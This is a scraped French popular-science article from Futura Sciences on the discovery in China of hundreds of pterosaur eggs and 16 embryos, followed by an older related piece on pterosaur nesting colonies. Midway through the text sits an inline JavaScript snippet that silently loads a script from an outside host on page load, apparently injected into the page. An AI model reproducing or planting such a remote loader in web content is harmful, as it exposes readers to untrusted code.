{"title": "Des centaines d'œufs de ptérosaures découverts en Chine", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "01/12/2017", "content": "Les ptérosaures, ces reptiles volants qui n'étaient pas des dinosaures mais qui les côtoyaient, livrent peu à peu leurs secrets aux paléontologues. La découverte de centaines d'œufs de ptérosaures en Chine nous indique que ces créatures devaient bien s'occuper de leurs petits. Non, les  ptérosaures , qui évoluaient dans les  airs , n'étaient pas des  dinosaures  (pas plus que les  plésiosaures , qui vivaient dans les mers). La confusion provient du fait que ces reptiles vivant au temps des dinosaures pouvaient être géants ; les dinosaures n'étaient pourtant pas tous de grande taille ! Quoi qu'il en soit, les ptérosaures n'en restent pas moins fascinants et ils font partie des animaux emblématiques de l'âge des « terribles lézards », comme le prouvent des films comme  Jurassic Park  et  Jurassic World . Un article récemment publié dans  Science  nous en apprend davantage sur les ptérosaures du  Crétacé . Bien que le premier ptérosaure fossile ait été décrit par le naturaliste italien Cosimo Collini en 1784 et qu'il fut trouvé dans des dépôts calcaires du Jurassique, près de Solnhofen, en Allemagne, ces reptiles volants sont apparus au  Trias , il y a au moins 230 millions d'années. Les ptérosaures étudiés dans cet article sont des  fossiles  datant de 120 millions d'années et qui ont été retrouvés non loin de la dépression de Tourfan, plus précisément dans le  bassin  de Turpan-Hami, dans la région autonome ouïghoure du Xinjiang (plus rarement appelée également Turkestan oriental), au nord-ouest de la Chine. Une vidéo de présentation du monde fascinant des ptérosaures. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur la roue dentée à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». ©  American Museum of Natural History 215 œufs et 16 embryons de ptérosaures Quelques restes fossilisés d'œufs de ptérosaures avaient déjà été trouvés dans cette région ; ils appartenaient à l' espèce  connue sous le nom de  Hamipterus tianshanensis . L'étude de ces œufs avait alors permis d'en apprendre un peu plus sur les ptérosaures, mais, jusqu'à présent, dans le monde entier, de tels œufs, et parfois les embryons à l'intérieur, restaient rares.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Or, voilà que des paléontologues chinois annoncent qu'ils ont identifié 215 œufs de  Hamipterus tianshanensis  dans un bloc de grès de 3,28 m 2  qui en contient peut-être 300. Surtout, pas moins de 16 embryons ont été retrouvés dans ces œufs, notamment grâce à la tomographie à rayons X. Les restes fossilisés d'œufs de ptérosaures chinois avec quelques os d'adultes. © Wang  et al., Science                               Des nouveau-nés incapables de voler ? Des restes de ptérosaures adultes ont aussi été trouvés mais leurs os, tout comme les œufs, sont orientés de façon très désordonnée. Cela indique que ce nid a subi un transport, suggérant un enfouissement rapide à l'occasion d'une inondation lors d'un orage dans un environnement fluvio-lacustre. La surface externe des œufs retrouvés présente des fissures et des craquelures ; tous sont partiellement déformés, ce qui indique une nature souple. La plupart d'entre eux sont complets. De petites fissures résultant de l'enfouissement expliquent pourquoi ces œufs ont été si bien conservés : cela leur a permis d'être rapidement emplis de sédiments fins. Bien que les experts s'affrontent à ce sujet, l'étude des os trouvés dans les embryons à différents stades de leur croissance suggère que les nouveau-nés étaient tout juste capables de marcher, mais certainement pas de voler, ni de se nourrir seuls. Si tel était bien le cas, des adultes devaient donc s'occuper d'eux au début de leur vie. Pour en savoir plus Des œufs fossiles dévoilent la vie grégaire des ptérosaures  Article de Jean-Luc Goudet publié le 07/06/2014 En Chine, des chercheurs ont découvert cinq œufs remarquablement conservés, « en trois dimensions », dans une zone comprenant des dizaines de squelettes de ptérosaures datant du Crétacé. Conclusion : ces maîtres du ciel nichaient en colonie. En général, quand des paléontologues découvrent des  œufs fossiles , ils sont complètement aplatis. Mais les cinq exemplaires qu'ont exhumés au nord-ouest de la Chine  Xiaolin Wang  et ses collègues sur un site connu depuis 2005 (le bassin Turpan-Hami) avaient, eux, conservé un peu de leur forme. Ils ont été découverts au milieu de  « douzaines, sinon de centaines »  d'ossements appartenant à des ptérosaures. Ce grand groupe de  vertébrés  volants (qui ne sont pas des  dinosaures ) a sillonné les airs entre 230 et 65 millions d'années avant notre ère. Leur envergure variait de 12 cm pour les plus petits à 12 m pour le géant  Quetzalcoaltus . Les œufs de ptérosaures retrouvés sont déformés mais pas briser ce qui s'explique par le fait qu'il devait être souple au moment où ils ont été enfouis. © Wang  et al., Science                               Tous ceux présents à Turpan-Hami appartiennent à une même espèce, jamais décrite auparavant et rangée dans un nouveau genre,  Hamipterus tianshanensis , par les auteurs de l'étude parue dans  Current Biology . Ils vivaient au bord d'un lac il y a 120 millions d'années, au Crétacé inférieur, et leur  crâne  arborait une crête osseuse sur l'avant de la tête, comme d'autres ptérosaures. Cet apanage est connu comme constituant un  caractère sexuel secondaire  chez les ptérosaures, présent chez les mâles. Les chercheurs, qui ont pu examiner 40 individus, ont vu une crête sur tous les squelettes. Mais ils en observent deux types, différant par la taille et la forme, et en concluent que les femelles en possédaient une également. Il est donc possible de déterminer le sexe d'un individu. Les œufs, retrouvés dans un état exceptionnel, ont pu être étudiés au  microscope électronique . Ovoïdes et longs d'environ 6 cm, ils étaient souples, avec une membrane épaisse, ressemblant à celle des œufs de serpent actuels, et pourtant entourée d'une très fine  coquille  externe  calcaire  de 60  micromètres . Ces  ptérosaures  devaient les  enfouir  dans le  sable  pour les protéger. Leur présence au sein d'ossements nombreux démontre, expliquent les auteurs, que les adultes nichaient ensemble, en groupes importants. De quoi préciser le mode de vie des ptérosaures, qui ont si longtemps dominé le ciel. Ce qu'il faut retenir Les ptérosaures étaient un groupe de reptiles volants très diversifié, présent sur toute la planète au temps des dinosaures (mais ils n'étaient pas eux-mêmes des dinosaures, pas plus que les grands reptiles marins de l'époque, d'ailleurs). On connaît encore peu de chose sur l'éthologie de ces animaux mais la découverte en Chine de 16 embryons dans un nid fossile contenant au moins 215 œufs nous donne peut-être quelques indications. Il est possible qu'au moins dans le cas de l'espèce ayant pondu ces œufs, à savoir  Hamipterus tianshanensis,  les adultes aient été obligés de s'occuper des petits juste après leur naissance . Cela vous intéressera aussi Interview : comment se forment les fossiles de dinosaures ?                       Les fossiles sont les seuls vestiges des dinosaures à avoir survécu jusqu'à notre époque. C’est à partir de ces restes que les scientifiques peuvent espérer comprendre ces anciens animaux. Futura-Sciences a interviewé Éric Buffetaut, paléontologue, afin d’en savoir plus sur leur formation.                                       ", "theme": "planete"}